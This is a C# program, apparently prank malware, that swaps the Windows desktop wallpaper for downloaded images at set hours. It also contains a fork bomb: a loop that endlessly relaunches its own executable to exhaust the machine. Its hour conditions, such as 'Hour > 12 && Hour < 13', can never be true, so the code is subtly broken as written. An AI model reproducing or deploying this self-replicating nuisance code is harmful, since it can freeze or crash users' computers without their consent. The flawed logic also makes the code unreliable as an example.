using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Drawing;
using System.Net;
using System.Security.Cryptography.X509Certificates;

namespace System
{
    class Program
    {
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public enum Style
        {
            Tiled,
            Centered,
            Stretched,
            Fill
        }

        static void Main(string[] args)
        {
               

            if (DateTime.Now.Hour > 12 && DateTime.Now.Hour < 13)
            {
                Set(new Uri("https://i.ytimg.com/vi/Uv5shWPfqvA/maxresdefault.jpg"), Style.Fill);
            }


            if (DateTime.Now.Hour > 13 && DateTime.Now.Hour < 14)
            {
                Set(new Uri("https://www.dailydot.com/wp-content/uploads/7dd/f2/f4ff8b0d242f954810eb3b609c747f31.jpg"), Style.Fill);
            }

            if (DateTime.Now.Hour > 14 && DateTime.Now.Hour < 15)
            {
                while (true)
                {
                    Process.Start(Assembly.GetExecutingAssembly().Location);
                }
            }

        }

        public static void Set(Uri uri, Style style)
        {
            Stream s = new WebClient().OpenRead(uri.ToString());

            System.Drawing.Image img = System.Drawing.Image.FromStream(s);
            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");          
            img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            if (style == Style.Stretched)
            {
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Centered)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Tiled)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 1.ToString());
            }

            if (style == Style.Fill)
            {
                key.SetValue(@"WallpaperStyle", 6.ToString());
                
            }



            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}
